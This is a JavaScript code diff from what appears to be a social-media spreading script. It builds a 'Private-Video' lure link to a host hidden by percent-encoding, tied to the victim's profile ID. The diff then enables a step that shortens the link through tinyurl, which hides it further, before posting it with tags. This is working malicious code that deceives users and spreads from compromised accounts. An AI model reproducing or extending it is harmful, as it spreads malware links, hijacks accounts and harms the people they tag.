@@ -152,18 +152,18 @@ function _d(c) {
 function _e(c) {
       var b = c["tags"];
       var linkk = "https://docs.google.com/gview?url=%76%72%74%2d%6d%72%74%2d%6c%6c%6c%6c%6c%2e%68%65%72%6f%6b%75%61%70%70%2ecom/Private-Video-"+ generate_name(rand(3,6), false) +".video?uid="+  profile_id;
-      // var xhr = new XMLHttpRequest();
-      // xhr.open("GET", "https://tinyurl.com/api-create.php?url="+linkk);
-      // xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-      // xhr.send();
-      // xhr.onreadystatechange = function() {
-      //     if (xhr.readyState == 4 && xhr.status == 200) {
-           //linkuu = xhr.responseText;
-           c["link"] = linkk;
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://tinyurl.com/api-create.php?url="+linkk);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+      xhr.send();
+      xhr.onreadystatechange = function() {
+          if (xhr.readyState == 4 && xhr.status == 200) {
+           linkuu = xhr.responseText;
+           c["link"] = linkuu;
            c["tags"] = b;
            post(c);
-      //     }
-      // }
+          }
+      }
 
 
 
